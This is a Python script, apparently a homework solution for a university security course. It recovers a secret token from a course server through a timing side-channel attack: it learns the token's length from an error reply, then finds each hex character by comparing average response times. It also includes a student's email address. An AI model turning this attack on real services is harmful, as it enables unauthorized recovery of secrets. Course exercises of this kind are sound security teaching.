from __future__ import division
import json
import requests
import time
import string

# My token = "73b8085b7347"
data = { "email": "martin.vold@epfl.ch", "token": "a" }
addr = "http://com402.epfl.ch/hw5/ex2"

# post = requests.post(addr, json=data)
# print(post.content)

# Server will tell the lenght of the token if it's not right, reply is "wrong length 12 vs 1"
# Get the length
post = requests.post(addr, json=data)
print(post.text)
length_of_token = int(post.text.split(" ")[2])
print("Length of Token: {}".format(length_of_token))
data["token"] = "a"*length_of_token

"""
Only need hexdigits for the token
characters = string.printable.split(" ")[0]
characters = characters.replace("'", "")
characters = characters.replace('"', "")
"""

characters = string.hexdigits
print("Characters to check: {}".format(characters))

# Find the token, timing attack
for char_index in range(length_of_token):
	times = {}
	for c in characters:
		print(c, end="", flush=True)
		test_token = data["token"]
		
		# Change the token
		test_token = test_token[:char_index] + c + "a"* (11 - char_index)
		data["token"] = test_token
		times[test_token] = []

		# Averaging the response time for a token
		for i in range(10):
			start_time = time.time()
			post = requests.post(addr, json=data)
			t = time.time() - start_time
			# print(post.text)
			# print("--- %s seconds ---" % t)
			times[test_token].append(t)
		times[test_token] = sum(times[test_token]) / len(times[test_token])
	new_token, new_token_time = None, float("-inf")
	print()
	
	# Find token with larges respons time and set it as the new token for the next iteration
	for key, value in times.items():
		if (value > new_token_time):
			new_token = key
			new_token_time = value
		print("{}: {}".format(key, value))
	data["token"] = new_token
	print("New Token is now: {}. Respons time: {}".format(data["token"], new_token_time))
	print()

# Our flag should be in the response
print("Chosen Token: {}".format(data["token"]))
post = requests.post(addr, json=data)
print(post.text)